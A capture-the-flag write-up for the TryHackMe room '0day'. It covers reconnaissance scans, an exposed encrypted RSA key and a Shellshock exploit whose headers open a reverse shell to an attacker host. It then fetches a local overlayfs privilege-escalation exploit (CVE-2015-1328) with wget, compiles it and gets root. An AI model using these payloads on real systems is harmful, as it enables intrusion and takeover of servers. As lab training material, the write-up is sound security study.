May 5, 2024<br>
Day 368<br>

<h1>0day</h1>

![image](https://github.com/user-attachments/assets/bdb1ba58-8d77-4783-b98d-409290c3ac15)


![image](https://github.com/user-attachments/assets/5307f288-917f-4721-b4f3-4e87003746f8)

<br>




<h2 align="center">$$\textcolor{white}{\textnormal{Nmap}}$$</h2>

<p align="center">There are have 2 ports open: <code>22/tcp</code> and <code>80/tcp</code>. </p>

```bash
:~# nmap -sC -sV -sS -A -O TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
...
```


<h2 align="center">$$\textcolor{white}{\textnormal{Gobuster}}$$</h2>

```bash
~# gobuster dir -u http://TargetIP -w /usr/share/dirb/wordlists/common.txt
...
/.htpasswd            (Status: 403) [Size: 287]
/.htaccess            (Status: 403) [Size: 287]
/.hta                 (Status: 403) [Size: 282]
/admin                (Status: 301) [Size: 309] [--> http://TargetIP/admin/]
/backup               (Status: 301) [Size: 310] [--> http://10.10.66.29/backup/]
/cgi-bin              (Status: 301) [Size: 311] [--> http://10.10.66.29/cgi-bin/]
/cgi-bin/             (Status: 403) [Size: 286]
/css                  (Status: 301) [Size: 307] [--> http://10.10.66.29/css/]
/img                  (Status: 301) [Size: 307] [--> http://10.10.66.29/img/]
/index.html           (Status: 200) [Size: 3025]
/js                   (Status: 301) [Size: 306] [--> http://10.10.66.29/js/]
/robots.txt           (Status: 200) [Size: 38]
/secret               (Status: 301) [Size: 310] [--> http://10.10.66.29/secret/]
/server-status        (Status: 403) [Size: 291]
/uploads              (Status: 301) [Size: 311] [--> http://10.10.66.29/uploads/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

<h2 align="center">$$\textcolor{white}{\textnormal{http://TargetIP}}$$</h2>

![image](https://github.com/user-attachments/assets/b1690ac7-49b8-4434-9910-d1056731dd23)


<h2 align="center">$$\textcolor{white}{\textnormal{http://TargetIP/admin}}$$</h2>

<p>-</p>

<h2 align="center">$$\textcolor{white}{\textnormal{http://TargetIP/secret}}$$</h2>

![image](https://github.com/user-attachments/assets/1703bfbe-429e-4288-acf1-704f82d70661)



<h2 align="center">$$\textcolor{white}{\textnormal{http://TargetIP/backup}}$$</h2>

<p>-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547 T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8 9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g /5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB 6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6 8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6 oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE 99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P -----END RSA PRIVATE KEY----- </p>

![image](https://github.com/user-attachments/assets/c8a31aa7-dc00-45c4-83eb-14cec238964c)

<h2 align="center">$$\textcolor{white}{\textnormal{http://TargetIP/robots.txt}}$$</h2>

![image](https://github.com/user-attachments/assets/305f2bbb-d658-46a4-be88-b70ad0d7133f)

<h2 align="center">$$\textcolor{white}{\textnormal{ssh}}$$</h2>

<p>ssh with the key discovered did not worked.</p>

<br>

<h2 align="center">$$\textcolor{white}{\textnormal{nikto}}$$</h2>

```bash
:~# nikto -h TargetIP
- Nikto v2.1.5
...
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0xbd1 0x5ae57bb9a1192 
+ The anti-clickjacking X-Frame-Options header is not present.
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /admin/index.html: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2025-05-09 23:41:24 (GMT1) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>

![image](https://github.com/user-attachments/assets/0602d513-8c7d-4fcc-bb0a-766bf9c972fb)

<br>




<h2 align="center">$$\textcolor{white}{\textnormal{http://TargetIP/cgi-bin/test.cgi}}$$</h2>

![image](https://github.com/user-attachments/assets/7fc3850b-f3d3-420a-b7af-e41442aba50b)

<br>

<h2 align="center">$$\textcolor{white}{\textnormal{curl}}$$</h2>


```bash
:~# curl http://TargetIP/cgi-bin/test.cgi \
> -H "User-Agent: $PWN" \
> -H "Cookie: $PWN" \
> -H "Referer: $PWN" -v
*   Trying TargetIP:80...
* TCP_NODELAY set
* Connected to TargetIP (TargetIP) port 80 (#0)
> GET /cgi-bin/test.cgi HTTP/1.1
> Host: TargetIP
> Accept: */*
> User-Agent: () { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/AttckIP/4444 0>&1 &'
> Cookie: () { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/AttackIP/4444 0>&1 &'
> Referer: () { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/AttackIP/4444 0>&1 &'
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 Internal Server Error
< Date: Fri, 09 May 2025 23:23:23 GMT
< Server: Apache/2.4.7 (Ubuntu)
< Content-Length: 608
< Connection: close
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.4.7 (Ubuntu) Server at TargetIP Port 80</address>
</body></html>
* Closing connection 0
```


```bash
:~# nc -lnvp 4444
Listening on 0.0.0.0 4444
...
www-data@ubuntu:/usr/lib/cgi-bin$ ls
ls
test.cgi
www-data@ubuntu:/usr/lib/cgi-bin$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
ryan
www-data@ubuntu:/home$ cd ryan
cd ryan
www-data@ubuntu:/home/ryan$ ls
ls
user.txt
www-data@ubuntu:/home/ryan$ cat user.txt
cat user.txt
THM{Sh3llSh0ck_r0ckz}
www-data@ubuntu:/home/ryan$ 
```

```bash
www-data@ubuntu:/home/ryan$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
www-data@ubuntu:/home/ryan$ uname -r
uname -r
3.13.0-32-generic
www-data@ubuntu:/home/ryan$ cd /tmp
cd /tmp

```


<p>Downloaded https://www.exploit-db.com/exploits/37292.c  ---> 37292.c</p>

<br>


![image](https://github.com/user-attachments/assets/475caf30-b61a-41c4-bf29-befab450da54)


```bash
:~# python3 -m http.server 6666
```

```bash
www-data@ubuntu:/tmp$ wget http://AttackIP:6666/37292.c
...
     0K ....                                                  100%  398M=0s

2025-05-09 16:30:29 (398 MB/s) - '37292.c' saved [5119/5119]

www-data@ubuntu:/tmp$ 


```


```bash
:~# python3 -m http.server 6666
Serving HTTP on 0.0.0.0 port 6666 (http://0.0.0.0:6666/) ...
10.10.66.29 - - [10/May/2025 00:30:29] "GET /37292.c HTTP/1.1" 200 -
```

```bash
www-data@ubuntu:/tmp$ gcc 37292.c -o exploit
gcc 37292.c -o exploit
gcc: error trying to exec 'cc1': execvp: No such file or directory
www-data@ubuntu:/tmp$ echo $PATH
echo $PATH
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
www-data@ubuntu:/tmp$ whereis gcc
whereis gcc
gcc: /usr/bin/gcc /usr/lib/gcc /usr/bin/X11/gcc /usr/share/man/man1/gcc.1.gz
www-data@ubuntu:/tmp$ export PATH=$PATH:/usr/bin
export PATH=$PATH:/usr/bin
www-data@ubuntu:/tmp$ gcc 37292.c -o exploit
gcc 37292.c -o exploit
www-data@ubuntu:/tmp$ ls
ls
37292.c
exploit
fCsLl
www-data@ubuntu:/tmp$ chmod +x 37292.c
chmod +x 37292.c
www-data@ubuntu:/tmp$ ./37292.c
./37292.c
: No such file or directory
./37292.c: line 8: $'\r': command not found
./37292.c: line 9: $'*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*\r': command not found
./37292.c: line 10: CVE-2015-1328: command not found
./37292.c: line 11: overlayfs: command not found
./37292.c: line 12: $'\r': command not found
./37292.c: line 13: user@ubuntu-server-1504:~$: command not found
./37292.c: line 14: Linux: command not found
./37292.c: line 15: user@ubuntu-server-1504:~$: command not found
./37292.c: line 16: user@ubuntu-server-1504:~$: command not found
./37292.c: line 17: syntax error near unexpected token `('
'/37292.c: line 17: `uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
www-data@ubuntu:/tmp$ ls
ls
37292.c
exploit
fCsLl
www-data@ubuntu:/tmp$ chmod +x 37292.c
chmod +x 37292.c
www-data@ubuntu:/tmp$ ls
ls
37292.c
exploit
fCsLl
www-data@ubuntu:/tmp$ 

www-data@ubuntu:/tmp$ chmod +x exploit
chmod +x exploit
www-data@ubuntu:/tmp$ ls
ls
37292.c
exploit
fCsLl
www-data@ubuntu:/tmp$ ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
root.txt
# cat root.txt
THM{g00d_j0b_0day_is_Pleased}
# 
```

<br>
<br>

![image](https://github.com/user-attachments/assets/e6090adb-38fc-47c0-9280-3279984e5e9b)

<br>

![image](https://github.com/user-attachments/assets/8a68d3c0-b07b-4a1f-8e2e-9e68c24aacbd)



<br>
<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |Global        | Brazil       | Global      | Brazil     |          | Completed |           |
| May 9, 2025       | 368      |     232nd    |        5ᵗʰ   |   437ᵗʰ     |     9ᵗʰ    | 100,633  |       720 |   62      |

</div>


![image](https://github.com/user-attachments/assets/a51f213a-2ff8-4b57-b62a-dfa82dc6ab40)

<br>

![image](https://github.com/user-attachments/assets/ad31f7b3-7a0a-47a6-8f37-3832ed175c10)

<br>

![image](https://github.com/user-attachments/assets/980b1300-aac7-4ca7-bac6-b7d281ee9db6)

<br>

![image](https://github.com/user-attachments/assets/06f212d5-8ebf-4184-8efc-42de07053a33)

<br>
<br>


![image](https://github.com/user-attachments/assets/b8e88158-0e2e-4e61-8a65-17faf1795da5)






